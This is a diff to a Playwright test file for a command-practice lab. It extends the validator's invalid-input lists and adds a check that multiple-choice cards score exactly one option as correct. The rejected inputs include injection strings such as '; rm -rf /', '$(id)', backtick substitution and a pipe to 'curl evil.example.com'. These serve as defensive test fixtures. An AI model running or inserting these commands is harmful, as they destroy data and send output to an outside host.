@@ -35,11 +35,19 @@ const MATRIX = [
       '@./src/index.js',
       '@~/notes.md'
     ],
-    invalid: ['', '@', '@   ', 'src/auth/login.ts', '@@x', '@!x', 'the file is @', '@src/a.ts; rm -rf /']
+    invalid: [
+      '', '@', '@   ', 'src/auth/login.ts', '@@x', '@!x', 'the file is @',
+      '@src/a.ts; rm -rf /', '@src/a.ts|rm -rf /', '@src/a.ts | cat', '@src/a.ts&&id', '@`id`', '@$(id)'
+    ]
   },
   {
     id: 'lab-bash',
-    valid: ['!npm test', '  !npm test ', '!npm   test', '!ls -la', '!NPM test'],
+    // `!` runs a shell command, so shell syntax is legitimate here. This is
+    // the deliberate asymmetry with the path/prompt operands.
+    valid: [
+      '!npm test', '  !npm test ', '!npm   test', '!ls -la', '!NPM test',
+      '!npm test && echo done', '!echo hi; ls', '!cat f | grep x', '!echo `date`'
+    ],
     invalid: ['', '!', '!   ', 'npm test', '!!x', 'run !npm test']
   },
   {
@@ -67,7 +75,11 @@ const MATRIX = [
       'summarize the diff',
       'claude -x "summarize the diff"',
       'claude -p "summarize the diff"; rm -rf /',
-      'claude -p "x" && curl evil.example.com'
+      'claude -p "x" && curl evil.example.com',
+      'claude -p "x"|curl evil.example.com',
+      'claude -p "x" | curl evil.example.com',
+      'claude -p "`id`"',
+      'claude -p "$(id)"'
     ]
   }
 ];
@@ -137,14 +149,55 @@ test.describe('practice lab validation', () => {
   });
 
   test('multiple-choice validation stays exact', async ({ page }) => {
-    const result = await page.evaluate(() => {
-      const card = document.querySelector('#lab .lab-q');
-      return { hasChoiceCards: !!card, total: document.querySelectorAll('#lab .lab-q').length };
-    });
-    expect(result.hasChoiceCards).toBe(true);
-    expect(result.total).toBe(12);
+    expect(await page.evaluate(() => document.querySelectorAll('#lab .lab-q').length)).toBe(12);
     // A choice challenge has no free-text validator and must not be judged as one.
     expect(await page.evaluate(() => window.__labHasValidator('lab-plan'))).toBe(false);
+
+    // Exactly one option may score as correct, and a wrong option must be
+    // rejected rather than silently accepted. The card disables its options
+    // once answered correctly, so each option is tried on a fresh render.
+    const optionCount = await page.evaluate(() => {
+      const card = [...document.querySelectorAll('#lab .lab-q')].find((c) =>
+        c.querySelector('.lab-choices')
+      );
+      return card.querySelectorAll('.lab-choices button').length;
+    });
+    expect(optionCount).toBeGreaterThan(1);
+
+    const outcome = [];
+    for (let i = 0; i < optionCount; i++) {
+      // Solved state persists by design, so clear it: otherwise the card
+      // renders already-answered and later clicks are no-ops.
+      await page.evaluate(() => {
+        try {
+          localStorage.removeItem('claude_hub_lab_v1');
+        } catch (e) {
+          /* ignore */
+        }
+      });
+      await page.reload();
+      await expect(page.locator('#lab-total')).toHaveText('12');
+      outcome.push(
+        await page.evaluate((idx) => {
+          const card = [...document.querySelectorAll('#lab .lab-q')].find((c) =>
+            c.querySelector('.lab-choices')
+          );
+          const btns = card.querySelectorAll('.lab-choices button');
+          btns[idx].click();
+          const fb = card.querySelector('.lab-fb');
+          return {
+            correct: btns[idx].classList.contains('correct'),
+            wrong: btns[idx].classList.contains('wrong'),
+            feedbackGood: !!fb && fb.className.includes('good')
+          };
+        }, i)
+      );
+    }
+    const correct = outcome.filter((r) => r.correct);
+    const wrong = outcome.filter((r) => r.wrong);
+    expect(correct, 'exactly one option must score correct').toHaveLength(1);
+    expect(wrong.length, 'every other option must be marked wrong').toBe(outcome.length - 1);
+    expect(correct[0].feedbackGood).toBe(true);
   });
 
   test('hints and solution reveal still work', async ({ page }) => {
